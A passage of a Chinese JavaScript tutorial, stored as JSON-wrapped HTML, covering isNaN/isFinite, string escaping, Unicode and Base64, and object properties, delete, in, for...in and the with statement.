等同于\nisNaN(Number([&#039;xzy&#039;])) // true</code></pre><p>但是，对于空数组和只有一个数值成员的数组，<code>isNaN</code>返回<code>false</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>isNaN([]) // false\nisNaN([123]) // false\nisNaN([&#039;123&#039;]) // false</code></pre><p>上面代码之所以返回<code>false</code>，原因是这些数组能被<code>Number</code>函数转成数值，请参见《数据类型转换》一章。</p>\n<p>因此，使用<code>isNaN</code>之前，最好判断一下数据类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>function myIsNaN(value) {\n  return typeof value === &#039;number&#039; &amp;&amp; isNaN(value);\n}</code></pre><p>判断<code>NaN</code>更可靠的方法是，利用<code>NaN</code>为唯一不等于自身的值的这个特点，进行判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>function myIsNaN(value) {\n  return value !== value;\n}</code></pre>\n        <h3>\n            <a href='#isFinite()' class='header-anchor'>#</a>\n            <span>isFinite()</span>\n        </h3>\n    <p><code>isFinite</code>方法返回一个布尔值，表示某个值是否为正常的数值。</p>\n<pre class=\"prettyprint language-javascript\"><code>isFinite(Infinity) // false\nisFinite(-Infinity) // false\nisFinite(NaN) // false\nisFinite(undefined) // false\nisFinite(null) // true\nisFinite(-1) // true</code></pre><p>除了<code>Infinity</code>、<code>-Infinity</code>、<code>NaN</code>和<code>undefined</code>这几个值会返回<code>false</code>，<code>isFinite</code>对于其他的数值都会返回<code>true</code>。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2012/04/number-encoding.html\">How numbers are encoded in JavaScript</a></li>\n<li>Humphry, <a href=\"http://blog.segmentfault.com/humphry/1190000000407658\">JavaScript 中 Number 的一些表示上/下限</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"字符串","link":"/types/string.html"}],"content":"\n        <h1>\n            <a href='#字符串' class='header-anchor'>#</a>\n            <span>字符串</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h3>\n    <p>字符串就是零个或多个排在一起的字符，放在单引号或双引号之中。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;\n&quot;abc&quot;</code></pre><p>单引号字符串的内部，可以使用双引号。双引号字符串的内部，可以使用单引号。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;key = &quot;value&quot;&#039;\n&quot;It&#039;s a long journey&quot;</code></pre><p>上面两个都是合法的字符串。</p>\n<p>如果要在单引号字符串的内部，使用单引号，就必须在内部的单引号前面加上反斜杠，用来转义。双引号字符串内部使用双引号，也是如此。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;Did she say \\&#039;Hello\\&#039;?&#039;\n// &quot;Did she say &#039;Hello&#039;?&quot;\n\n&quot;Did she say \\&quot;Hello\\&quot;?&quot;\n// &quot;Did she say &quot;Hello&quot;?&quot;</code></pre><p>由于 HTML 语言的属性值使用双引号，所以很多项目约定 JavaScript 语言的字符串只使用单引号，本教程遵守这个约定。当然，只使用双引号也完全可以。重要的是坚持使用一种风格，不要一会使用单引号表示字符串，一会又使用双引号表示。</p>\n<p>字符串默认只能写在一行内，分成多行将会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;a\nb\nc&#039;\n// SyntaxError: Unexpected token ILLEGAL</code></pre><p>上面代码将一个字符串分成三行，JavaScript 就会报错。</p>\n<p>如果长字符串必须分成多行，可以在每一行的尾部使用反斜杠。</p>\n<pre class=\"prettyprint language-javascript\"><code>var longString = &#039;Long \\\nlong \\\nlong \\\nstring&#039;;\n\nlongString\n// &quot;Long long long string&quot;</code></pre><p>上面代码表示，加了反斜杠以后，原来写在一行的字符串，可以分成多行书写。但是，输出的时候还是单行，效果与写在同一行完全一样。注意，反斜杠的后面必须是换行符，而不能有其他字符（比如空格），否则会报错。</p>\n<p>连接运算符（<code>+</code>）可以连接多个单行字符串，将长字符串拆成多行书写，输出的时候也是单行。</p>\n<pre class=\"prettyprint language-javascript\"><code>var longString = &#039;Long &#039;\n  + &#039;long &#039;\n  + &#039;long &#039;\n  + &#039;string&#039;;</code></pre><p>如果想输出多行字符串，有一种利用多行注释的变通方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function () { /*\nline 1\nline 2\nline 3\n*/}).toString().split(&#039;\\n&#039;).slice(1, -1).join(&#039;\\n&#039;)\n// &quot;line 1\n// line 2\n// line 3&quot;</code></pre><p>上面的例子中，输出的字符串就是多行。</p>\n\n        <h3>\n            <a href='#转义' class='header-anchor'>#</a>\n            <span>转义</span>\n        </h3>\n    <p>反斜杠（\\）在字符串内有特殊含义，用来表示一些特殊字符，所以又称为转义符。</p>\n<p>需要用反斜杠转义的特殊字符，主要有下面这些。</p>\n<ul>\n<li><code>\\0</code> ：null（<code>\\u0000</code>）</li>\n<li><code>\\b</code> ：后退键（<code>\\u0008</code>）</li>\n<li><code>\\f</code> ：换页符（<code>\\u000C</code>）</li>\n<li><code>\\n</code> ：换行符（<code>\\u000A</code>）</li>\n<li><code>\\r</code> ：回车键（<code>\\u000D</code>）</li>\n<li><code>\\t</code> ：制表符（<code>\\u0009</code>）</li>\n<li><code>\\v</code> ：垂直制表符（<code>\\u000B</code>）</li>\n<li><code>\\&#39;</code> ：单引号（<code>\\u0027</code>）</li>\n<li><code>\\&quot;</code> ：双引号（<code>\\u0022</code>）</li>\n<li><code>\\\\</code> ：反斜杠（<code>\\u005C</code>）</li>\n</ul>\n<p>上面这些字符前面加上反斜杠，都表示特殊含义。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(&#039;1\\n2&#039;)\n// 1\n// 2</code></pre><p>上面代码中，<code>\\n</code>表示换行，输出的时候就分成了两行。</p>\n<p>反斜杠还有三种特殊用法。</p>\n<p>（1）<code>\\HHH</code></p>\n<p>反斜杠后面紧跟三个八进制数（<code>000</code>到<code>377</code>），代表一个字符。<code>HHH</code>对应该字符的 Unicode 码点，比如<code>\\251</code>表示版权符号。显然，这种方法只能输出256种字符。</p>\n<p>（2）<code>\\xHH</code></p>\n<p><code>\\x</code>后面紧跟两个十六进制数（<code>00</code>到<code>FF</code>），代表一个字符。<code>HH</code>对应该字符的 Unicode 码点，比如<code>\\xA9</code>表示版权符号。这种方法也只能输出256种字符。</p>\n<p>（3）<code>\\uXXXX</code></p>\n<p><code>\\u</code>后面紧跟四个十六进制数（<code>0000</code>到<code>FFFF</code>），代表一个字符。<code>XXXX</code>对应该字符的 Unicode 码点，比如<code>\\u00A9</code>表示版权符号。</p>\n<p>下面是这三种字符特殊写法的例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\251&#039; // &quot;©&quot;\n&#039;\\xA9&#039; // &quot;©&quot;\n&#039;\\u00A9&#039; // &quot;©&quot;\n\n&#039;\\172&#039; === &#039;z&#039; // true\n&#039;\\x7A&#039; === &#039;z&#039; // true\n&#039;\\u007A&#039; === &#039;z&#039; // true</code></pre><p>如果在非特殊字符前面使用反斜杠，则反斜杠会被省略。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;\\a&#039;\n// &quot;a&quot;</code></pre><p>上面代码中，<code>a</code>是一个正常字符，前面加反斜杠没有特殊含义，反斜杠会被自动省略。</p>\n<p>如果字符串的正常内容之中，需要包含反斜杠，则反斜杠前面需要再加一个反斜杠，用来对自身转义。</p>\n<pre class=\"prettyprint language-javascript\"><code>&quot;Prev \\\\ Next&quot;\n// &quot;Prev \\ Next&quot;</code></pre>\n        <h3>\n            <a href='#字符串与数组' class='header-anchor'>#</a>\n            <span>字符串与数组</span>\n        </h3>\n    <p>字符串可以被视为字符数组，因此可以使用数组的方括号运算符，用来返回某个位置的字符（位置编号从0开始）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns[0] // &quot;h&quot;\ns[1] // &quot;e&quot;\ns[4] // &quot;o&quot;\n\n// 直接对字符串使用方括号运算符\n&#039;hello&#039;[1] // &quot;e&quot;</code></pre><p>如果方括号中的数字超过字符串的长度，或者方括号中根本不是数字，则返回<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;abc&#039;[3] // undefined\n&#039;abc&#039;[-1] // undefined\n&#039;abc&#039;[&#039;x&#039;] // undefined</code></pre><p>但是，字符串与数组的相似性仅此而已。实际上，无法改变字符串之中的单个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\n\ndelete s[0];\ns // &quot;hello&quot;\n\ns[1] = &#039;a&#039;;\ns // &quot;hello&quot;\n\ns[5] = &#039;!&#039;;\ns // &quot;hello&quot;</code></pre><p>上面代码表示，字符串内部的单个字符无法改变和增删，这些操作会默默地失败。</p>\n\n        <h3>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h3>\n    <p><code>length</code>属性返回字符串的长度，该属性也是无法改变的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;hello&#039;;\ns.length // 5\n\ns.length = 3;\ns.length // 5\n\ns.length = 7;\ns.length // 5</code></pre><p>上面代码表示字符串的<code>length</code>属性无法改变，但是不会报错。</p>\n\n        <h2>\n            <a href='#字符集' class='header-anchor'>#</a>\n            <span>字符集</span>\n        </h2>\n    <p>JavaScript 使用 Unicode 字符集。JavaScript 引擎内部，所有字符都用 Unicode 表示。</p>\n<p>JavaScript 不仅以 Unicode 储存字符，还允许直接在程序中使用 Unicode 码点表示字符，即将字符写成<code>\\uxxxx</code>的形式，其中<code>xxxx</code>代表该字符的 Unicode 码点。比如，<code>\\u00A9</code>代表版权符号。</p>\n<pre class=\"prettyprint language-javascript\"><code>var s = &#039;\\u00A9&#039;;\ns // &quot;©&quot;</code></pre><p>解析代码的时候，JavaScript 会自动识别一个字符是字面形式表示，还是 Unicode 形式表示。输出给用户的时候，所有字符都会转成字面形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f\\u006F\\u006F = &#039;abc&#039;;\nfoo // &quot;abc&quot;</code></pre><p>上面代码中，第一行的变量名<code>foo</code>是 Unicode 形式表示，第二行是字面形式表示。JavaScript 会自动识别。</p>\n<p>我们还需要知道，每个字符在 JavaScript 内部都是以16位（即2个字节）的 UTF-16 格式储存。也就是说，JavaScript 的单位字符长度固定为16位长度，即2个字节。</p>\n<p>但是，UTF-16 有两种长度：对于码点在<code>U+0000</code>到<code>U+FFFF</code>之间的字符，长度为16位（即2个字节）；对于码点在<code>U+10000</code>到<code>U+10FFFF</code>之间的字符，长度为32位（即4个字节），而且前两个字节在<code>0xD800</code>到<code>0xDBFF</code>之间，后两个字节在<code>0xDC00</code>到<code>0xDFFF</code>之间。举例来说，码点<code>U+1D306</code>对应的字符为<code>𝌆，</code>它写成 UTF-16 就是<code>0xD834 0xDF06</code>。</p>\n<p>JavaScript 对 UTF-16 的支持是不完整的，由于历史原因，只支持两字节的字符，不支持四字节的字符。这是因为 JavaScript 第一版发布的时候，Unicode 的码点只编到<code>U+FFFF</code>，因此两字节足够表示了。后来，Unicode 纳入的字符越来越多，出现了四字节的编码。但是，JavaScript 的标准此时已经定型了，统一将字符长度限制在两字节，导致无法识别四字节的字符。上一节的那个四字节字符<code>𝌆</code>，浏览器会正确识别这是一个字符，但是 JavaScript 无法识别，会认为这是两个字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>&#039;𝌆&#039;.length // 2</code></pre><p>上面代码中，JavaScript 认为<code>𝌆</code>的长度为2，而不是1。</p>\n<p>总结一下，对于码点在<code>U+10000</code>到<code>U+10FFFF</code>之间的字符，JavaScript 总是认为它们是两个字符（<code>length</code>属性为2）。所以处理的时候，必须把这一点考虑在内，也就是说，JavaScript 返回的字符串长度可能是不正确的。</p>\n\n        <h2>\n            <a href='#Base64-转码' class='header-anchor'>#</a>\n            <span>Base64 转码</span>\n        </h2>\n    <p>有时，文本里面包含一些不可打印的符号，比如 ASCII 码0到31的符号都无法打印出来，这时可以使用 Base64 编码，将它们转成可以打印的字符。另一个场景是，有时需要以文本格式传递二进制数据，那么也可以使用 Base64 编码。</p>\n<p>所谓 Base64 就是一种编码方法，可以将任意值转成 0～9、A～Z、a-z、<code>+</code>和<code>/</code>这64个字符组成的可打印字符。使用它的主要目的，不是为了加密，而是为了不出现特殊字符，简化程序的处理。</p>\n<p>JavaScript 原生提供两个 Base64 相关的方法。</p>\n<ul>\n<li><code>btoa()</code>：任意值转为 Base64 编码</li>\n<li><code>atob()</code>：Base64 编码转为原来的值</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>var string = &#039;Hello World!&#039;;\nbtoa(string) // &quot;SGVsbG8gV29ybGQh&quot;\natob(&#039;SGVsbG8gV29ybGQh&#039;) // &quot;Hello World!&quot;</code></pre><p>注意，这两个方法不适合非 ASCII 码的字符，会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>btoa(&#039;你好&#039;) // 报错</code></pre><p>要将非 ASCII 码字符转为 Base64 编码，必须中间插入一个转码环节，再使用这两个方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function b64Encode(str) {\n  return btoa(encodeURIComponent(str));\n}\n\nfunction b64Decode(str) {\n  return decodeURIComponent(atob(str));\n}\n\nb64Encode(&#039;你好&#039;) // &quot;JUU0JUJEJUEwJUU1JUE1JUJE&quot;\nb64Decode(&#039;JUU0JUJEJUEwJUU1JUE1JUJE&#039;) // &quot;你好&quot;</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Mathias Bynens, <a href=\"http://mathiasbynens.be/notes/javascript-encoding\">JavaScript’s internal character encoding: UCS-2 or UTF-16?</a></li>\n<li>Mathias Bynens, <a href=\"http://mathiasbynens.be/notes/javascript-unicode\">JavaScript has a Unicode problem</a></li>\n<li>Mozilla Developer Network, <a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Window.btoa\">Window.btoa</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"对象","link":"/types/object.html"}],"content":"\n        <h1>\n            <a href='#对象' class='header-anchor'>#</a>\n            <span>对象</span>\n        </h1>\n    \n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#生成方法' class='header-anchor'>#</a>\n            <span>生成方法</span>\n        </h3>\n    <p>对象（object）是 JavaScript 语言的核心概念，也是最重要的数据类型。</p>\n<p>什么是对象？简单说，对象就是一组“键值对”（key-value）的集合，是一种无序的复合数据集合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  foo: &#039;Hello&#039;,\n  bar: &#039;World&#039;\n};</code></pre><p>上面代码中，大括号就定义了一个对象，它被赋值给变量<code>obj</code>，所以变量<code>obj</code>就指向一个对象。该对象内部包含两个键值对（又称为两个“成员”），第一个键值对是<code>foo: &#39;Hello&#39;</code>，其中<code>foo</code>是“键名”（成员的名称），字符串<code>Hello</code>是“键值”（成员的值）。键名与键值之间用冒号分隔。第二个键值对是<code>bar: &#39;World&#39;</code>，<code>bar</code>是键名，<code>World</code>是键值。两个键值对之间用逗号分隔。</p>\n\n        <h3>\n            <a href='#键名' class='header-anchor'>#</a>\n            <span>键名</span>\n        </h3>\n    <p>对象的所有键名都是字符串（ES6 又引入了 Symbol 值也可以作为键名），所以加不加引号都可以。上面的代码也可以写成下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  &#039;foo&#039;: &#039;Hello&#039;,\n  &#039;bar&#039;: &#039;World&#039;\n};</code></pre><p>如果键名是数值，会被自动转为字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  1: &#039;a&#039;,\n  3.2: &#039;b&#039;,\n  1e2: true,\n  1e-2: true,\n  .234: true,\n  0xFF: true\n};\n\nobj\n// Object {\n//   1: &quot;a&quot;,\n//   3.2: &quot;b&quot;,\n//   100: true,\n//   0.01: true,\n//   0.234: true,\n//   255: true\n// }\n\nobj[&#039;100&#039;] // true</code></pre><p>上面代码中，对象<code>obj</code>的所有键名虽然看上去像数值，实际上都被自动转成了字符串。</p>\n<p>如果键名不符合标识名的条件（比如第一个字符为数字，或者含有空格或运算符），且也不是数字，则必须加上引号，否则会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\nvar obj = {\n  1p: &#039;Hello World&#039;\n};\n\n// 不报错\nvar obj = {\n  &#039;1p&#039;: &#039;Hello World&#039;,\n  &#039;h w&#039;: &#039;Hello World&#039;,\n  &#039;p+q&#039;: &#039;Hello World&#039;\n};</code></pre><p>上面对象的三个键名，都不符合标识名的条件，所以必须加上引号。</p>\n<p>对象的每一个键名又称为“属性”（property），它的“键值”可以是任何数据类型。如果一个属性的值为函数，通常把这个属性称为“方法”，它可以像函数那样调用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: function (x) {\n    return 2 * x;\n  }\n};\n\nobj.p(1) // 2</code></pre><p>上面代码中，对象<code>obj</code>的属性<code>p</code>，就指向一个函数。</p>\n<p>如果属性的值还是一个对象，就形成了链式引用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = { bar: &#039;hello&#039; };\n\no1.foo = o2;\no1.foo.bar // &quot;hello&quot;</code></pre><p>上面代码中，对象<code>o1</code>的属性<code>foo</code>指向对象<code>o2</code>，就可以链式引用<code>o2</code>的属性。</p>\n<p>对象的属性之间用逗号分隔，最后一个属性后面可以加逗号（trailing comma），也可以不加。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: 123,\n  m: function () { ... },\n}</code></pre><p>上面的代码中，<code>m</code>属性后面的那个逗号，有没有都可以。</p>\n<p>属性可以动态创建，不必在对象声明时就指定。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nobj.foo = 123;\nobj.foo // 123</code></pre><p>上面代码中，直接对<code>obj</code>对象的<code>foo</code>属性赋值，结果就在运行时创建了<code>foo</code>属性。</p>\n\n        <h3>\n            <a href='#对象的引用' class='header-anchor'>#</a>\n            <span>对象的引用</span>\n        </h3>\n    <p>如果不同的变量名指向同一个对象，那么它们都是这个对象的引用，也就是说指向同一个内存地址。修改其中一个变量，会影响到其他所有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = o1;\n\no1.a = 1;\no2.a // 1\n\no2.b = 2;\no1.b // 2</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>指向同一个对象，因此为其中任何一个变量添加属性，另一个变量都可以读写该属性。</p>\n<p>此时，如果取消某一个变量对于原对象的引用，不会影响到另一个变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var o1 = {};\nvar o2 = o1;\n\no1 = 1;\no2 // {}</code></pre><p>上面代码中，<code>o1</code>和<code>o2</code>指向同一个对象，然后<code>o1</code>的值变为1，这时不会对<code>o2</code>产生影响，<code>o2</code>还是指向原来的那个对象。</p>\n<p>但是，这种引用只局限于对象，如果两个变量指向同一个原始类型的值。那么，变量这时都是值的拷贝。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = x;\n\nx = 2;\ny // 1</code></pre><p>上面的代码中，当<code>x</code>的值发生变化后，<code>y</code>的值并不变，这就表示<code>y</code>和<code>x</code>并不是指向同一个内存地址。</p>\n\n        <h3>\n            <a href='#表达式还是语句？' class='header-anchor'>#</a>\n            <span>表达式还是语句？</span>\n        </h3>\n    <p>对象采用大括号表示，这导致了一个问题：如果行首是一个大括号，它到底是表达式还是语句？</p>\n<pre class=\"prettyprint language-javascript\"><code>{ foo: 123 }</code></pre><p>JavaScript 引擎读到上面这行代码，会发现可能有两种含义。第一种可能是，这是一个表达式，表示一个包含<code>foo</code>属性的对象；第二种可能是，这是一个语句，表示一个代码区块，里面有一个标签<code>foo</code>，指向表达式<code>123</code>。</p>\n<p>为了避免这种歧义，V8 引擎规定，如果行首是大括号，一律解释为对象。不过，为了避免歧义，最好在大括号前加上圆括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>({ foo: 123})</code></pre><p>这种差异在<code>eval</code>语句（作用是对字符串求值）中反映得最明显。</p>\n<pre class=\"prettyprint language-javascript\"><code>eval(&#039;{foo: 123}&#039;) // 123\neval(&#039;({foo: 123})&#039;) // {foo: 123}</code></pre><p>上面代码中，如果没有圆括号，<code>eval</code>将其理解为一个代码块；加上圆括号以后，就理解成一个对象。</p>\n\n        <h2>\n            <a href='#属性的操作' class='header-anchor'>#</a>\n            <span>属性的操作</span>\n        </h2>\n    \n        <h3>\n            <a href='#属性的读取' class='header-anchor'>#</a>\n            <span>属性的读取</span>\n        </h3>\n    <p>读取对象的属性，有两种方法，一种是使用点运算符，还有一种是使用方括号运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  p: &#039;Hello World&#039;\n};\n\nobj.p // &quot;Hello World&quot;\nobj[&#039;p&#039;] // &quot;Hello World&quot;</code></pre><p>上面代码分别采用点运算符和方括号运算符，读取属性<code>p</code>。</p>\n<p>请注意，如果使用方括号运算符，键名必须放在引号里面，否则会被当作变量处理。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = &#039;bar&#039;;\n\nvar obj = {\n  foo: 1,\n  bar: 2\n};\n\nobj.foo  // 1\nobj[foo]  // 2</code></pre><p>上面代码中，引用对象<code>obj</code>的<code>foo</code>属性时，如果使用点运算符，<code>foo</code>就是字符串；如果使用方括号运算符，但是不使用引号，那么<code>foo</code>就是一个变量，指向字符串<code>bar</code>。</p>\n<p>方括号运算符内部还可以使用表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>obj[&#039;hello&#039; + &#039; world&#039;]\nobj[3 + 3]</code></pre><p>数字键可以不加引号，因为会自动转成字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  0.7: &#039;Hello World&#039;\n};\n\nobj[&#039;0.7&#039;] // &quot;Hello World&quot;\nobj[0.7] // &quot;Hello World&quot;</code></pre><p>上面代码中，对象<code>obj</code>的数字键<code>0.7</code>，加不加引号都可以，因为会被自动转为字符串。</p>\n<p>注意，数值键名不能使用点运算符（因为会被当成小数点），只能使用方括号运算符。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  123: &#039;hello world&#039;\n};\n\nobj.123 // 报错\nobj[123] // &quot;hello world&quot;</code></pre><p>上面代码的第一个表达式，对数值键名<code>123</code>使用点运算符，结果报错。第二个表达式使用方括号运算符，结果就是正确的。</p>\n\n        <h3>\n            <a href='#属性的赋值' class='header-anchor'>#</a>\n            <span>属性的赋值</span>\n        </h3>\n    <p>点运算符和方括号运算符，不仅可以用来读取值，还可以用来赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\nobj.foo = &#039;Hello&#039;;\nobj[&#039;bar&#039;] = &#039;World&#039;;</code></pre><p>上面代码中，分别使用点运算符和方括号运算符，对属性赋值。</p>\n<p>JavaScript 允许属性的“后绑定”，也就是说，你可以在任意时刻新增属性，没必要在定义对象的时候，就定义好属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n\n// 等价于\n\nvar obj = {};\nobj.p = 1;</code></pre>\n        <h3>\n            <a href='#属性的查看' class='header-anchor'>#</a>\n            <span>属性的查看</span>\n        </h3>\n    <p>查看一个对象本身的所有属性，可以使用<code>Object.keys</code>方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {\n  key1: 1,\n  key2: 2\n};\n\nObject.keys(obj);\n// [&#039;key1&#039;, &#039;key2&#039;]</code></pre>\n        <h3>\n            <a href='#属性的删除：delete-命令' class='header-anchor'>#</a>\n            <span>属性的删除：delete 命令</span>\n        </h3>\n    <p><code>delete</code>命令用于删除对象的属性，删除成功后返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\nObject.keys(obj) // [&quot;p&quot;]\n\ndelete obj.p // true\nobj.p // undefined\nObject.keys(obj) // []</code></pre><p>上面代码中，<code>delete</code>命令删除对象<code>obj</code>的<code>p</code>属性。删除后，再读取<code>p</code>属性就会返回<code>undefined</code>，而且<code>Object.keys</code>方法的返回值也不再包括该属性。</p>\n<p>注意，删除一个不存在的属性，<code>delete</code>不报错，而且返回<code>true</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\ndelete obj.p // true</code></pre><p>上面代码中，对象<code>obj</code>并没有<code>p</code>属性，但是<code>delete</code>命令照样返回<code>true</code>。因此，不能根据<code>delete</code>命令的结果，认定某个属性是存在的。</p>\n<p>只有一种情况，<code>delete</code>命令会返回<code>false</code>，那就是该属性存在，且不得删除。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = Object.defineProperty({}, &#039;p&#039;, {\n  value: 123,\n  configurable: false\n});\n\nobj.p // 123\ndelete obj.p // false</code></pre><p>上面代码之中，对象<code>obj</code>的<code>p</code>属性是不能删除的，所以<code>delete</code>命令返回<code>false</code>（关于<code>Object.defineProperty</code>方法的介绍，请看《标准库》的 Object 对象一章）。</p>\n<p>另外，需要注意的是，<code>delete</code>命令只能删除对象本身的属性，无法删除继承的属性（关于继承参见《面向对象编程》章节）。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\ndelete obj.toString // true\nobj.toString // function toString() { [native code] }</code></pre><p>上面代码中，<code>toString</code>是对象<code>obj</code>继承的属性，虽然<code>delete</code>命令返回<code>true</code>，但该属性并没有被删除，依然存在。这个例子还说明，即使<code>delete</code>返回<code>true</code>，该属性依然可能读取到值。</p>\n\n        <h3>\n            <a href='#属性是否存在：in-运算符' class='header-anchor'>#</a>\n            <span>属性是否存在：in 运算符</span>\n        </h3>\n    <p><code>in</code>运算符用于检查对象是否包含某个属性（注意，检查的是键名，不是键值），如果包含就返回<code>true</code>，否则返回<code>false</code>。它的左边是一个字符串，表示属性名，右边是一个对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n&#039;p&#039; in obj // true\n&#039;toString&#039; in obj // true</code></pre><p><code>in</code>运算符的一个问题是，它不能识别哪些属性是对象自身的，哪些属性是继承的。就像上面代码中，对象<code>obj</code>本身并没有<code>toString</code>属性，但是<code>in</code>运算符会返回<code>true</code>，因为这个属性是继承的。</p>\n<p>这时，可以使用对象的<code>hasOwnProperty</code>方法判断一下，是否为对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nif (&#039;toString&#039; in obj) {\n  console.log(obj.hasOwnProperty(&#039;toString&#039;)) // false\n}</code></pre>\n        <h3>\n            <a href='#属性的遍历：for...in-循环' class='header-anchor'>#</a>\n            <span>属性的遍历：for...in 循环</span>\n        </h3>\n    <p><code>for...in</code>循环用来遍历一个对象的全部属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {a: 1, b: 2, c: 3};\n\nfor (var i in obj) {\n  console.log(&#039;键名：&#039;, i);\n  console.log(&#039;键值：&#039;, obj[i]);\n}\n// 键名： a\n// 键值： 1\n// 键名： b\n// 键值： 2\n// 键名： c\n// 键值： 3</code></pre><p><code>for...in</code>循环有两个使用注意点。</p>\n<ul>\n<li>它遍历的是对象所有可遍历（enumerable）的属性，会跳过不可遍历的属性。</li>\n<li>它不仅遍历对象自身的属性，还遍历继承的属性。</li>\n</ul>\n<p>举例来说，对象都继承了<code>toString</code>属性，但是<code>for...in</code>循环不会遍历到这个属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\n\n// toString 属性是存在的\nobj.toString // toString() { [native code] }\n\nfor (var p in obj) {\n  console.log(p);\n} // 没有任何输出</code></pre><p>上面代码中，对象<code>obj</code>继承了<code>toString</code>属性，该属性不会被<code>for...in</code>循环遍历到，因为它默认是“不可遍历”的。关于对象属性的可遍历性，参见《标准库》章节中 Object 一章的介绍。</p>\n<p>如果继承的属性是可遍历的，那么就会被<code>for...in</code>循环遍历到。但是，一般情况下，都是只想遍历对象自身的属性，所以使用<code>for...in</code>的时候，应该结合使用<code>hasOwnProperty</code>方法，在循环内部判断一下，某个属性是否为对象自身的属性。</p>\n<pre class=\"prettyprint language-javascript\"><code>var person = { name: &#039;老张&#039; };\n\nfor (var key in person) {\n  if (person.hasOwnProperty(key)) {\n    console.log(key);\n  }\n}\n// name</code></pre>\n        <h2>\n            <a href='#with-语句' class='header-anchor'>#</a>\n            <span>with 语句</span>\n        </h2>\n    <p><code>with</code>语句的格式如下：</p>\n<pre class=\"prettyprint language-javascript\"><code>with (对象) {\n  语句;\n}</code></pre><p>它的作用是操作同一个对象的多个属性时，提供一些书写的方便。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 例一\nvar obj = {\n  p1: 1,\n  p2: 2,\n};\nwith (obj) {\n  p1 = 4;\n  p2 = 5;\n}\n// 等同于\nobj.p1 = 4;\nobj.p2 = 5;\n\n// 例二\nwith (document.links[0]){\n  console.log(href);\n  console.log(title);\n  console.log(style);\n}\n// 等同于\nconsole.log(document.links[0].href);\nconsole.log(document.links[0].title);\nconsole.log(document.links[0].style);</code></pre><p>注意，如果<code>with</code>区块内部有变量的赋值操作，必须是当前对象已经存在的属性，否则会创造一个当前作用域的全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = {};\nwith (obj) {\n  p1 = 4;\n  p2 = 5;\n}\n\nobj.p1 // undefined\np1 // 